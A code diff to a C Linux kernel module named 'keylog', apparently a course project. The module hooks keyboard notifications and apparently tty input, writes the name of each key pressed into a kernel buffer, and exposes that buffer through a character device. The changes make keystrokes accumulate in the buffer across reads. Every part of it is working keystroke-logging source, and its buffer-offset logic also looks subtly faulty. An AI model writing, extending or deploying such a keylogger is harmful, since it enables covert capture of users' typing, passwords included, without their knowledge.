@@ -21,12 +21,12 @@
 #define KEYLOG_MAJOR 60
 #define KEYLOG_NAME  "keylog"
 
-#define MAX_KEYS_LOGGED 32
+#define KEYLOG_BUF_SIZE 32
 
 MODULE_LICENSE( "Dual BSD/GPL" );
 
 static char *key_buffer;
-static int  cur_buf_length = 0;
+static int  fpos_read, fpos_unread = 0;
 
 static void (*old_receive_buf) (struct tty_struct *tty, const unsigned char *cp,
                         char *fp, int count);
@@ -52,21 +52,21 @@ int key_open( struct inode *inode, struct file *filp ) {
 
 ssize_t key_read( struct file *filp, char *buf, size_t count, loff_t *f_pos ) {
     int err = 0;
-    
-    print812( "Reading from device" );
 
-    err = copy_to_user( buf, key_buffer, cur_buf_length );
-    if ( err < 0 ) {
-        print812( "Copying to user failed (%d)", err );
-        return err;
+    if ( fpos_read < fpos_unread ) {
+        err = copy_to_user( buf, key_buffer, fpos_unread - fpos_read );
+        if ( err < 0 ) {
+            print812( "Copying to user failed (%d)", err );
+            return err;
+        }
+
+        *f_pos = fpos_unread;
+        fpos_read = fpos_unread;
+
+        return *f_pos;
     }
 
-    if ( *f_pos == 0 ) {
-        *f_pos += cur_buf_length;
-        return cur_buf_length;
-    } else {
-        return 0;
-    }
+    return 0;
 }
 
 struct file* file_open(const char* path, int flags, int rights) {
@@ -109,11 +109,18 @@ void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, 
 
 int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
     struct keyboard_notifier_param *param = _param;
-    // struct vc_data *vc = param->vc;
-    
-    if (code == KBD_KEYCODE) {
-        cur_buf_length = sprintf( key_buffer, "%s\n", GET_KEYNAME( param->value ) );
-        print812( "Keycode %i %s\n", param->value, (param->down ? "down" : "up") );
+    char *key_name = NULL; 
+    int new_buf_pos = 0;
+
+    if ( code == KBD_KEYCODE && param->down ) {
+        key_name = GET_KEYNAME( param->value );
+        new_buf_pos = strlen( key_name ) + ( fpos_unread - fpos_read ) + 1; // +1 to account for line break
+
+        if ( new_buf_pos < KEYLOG_BUF_SIZE ) {
+            fpos_unread += sprintf( key_buffer + ( fpos_unread - fpos_read ), "%s\n", key_name );
+        }
+
+        // print812( "Keycode %i %s\n", param->value, (param->down ? "down" : "up") );
     }
 
     return NOTIFY_OK;
@@ -139,7 +146,7 @@ static int hello_init( void ) {
         return err;
     }
 
-    key_buffer = kzalloc( sizeof(char) * MAX_KEYS_LOGGED, GFP_KERNEL );
+    key_buffer = kzalloc( sizeof(char) * KEYLOG_BUF_SIZE, GFP_KERNEL );
     if ( !key_buffer ) {
         err = -ENOMEM;
         print812( "Failed to allocate keybuffer (%d)", err );
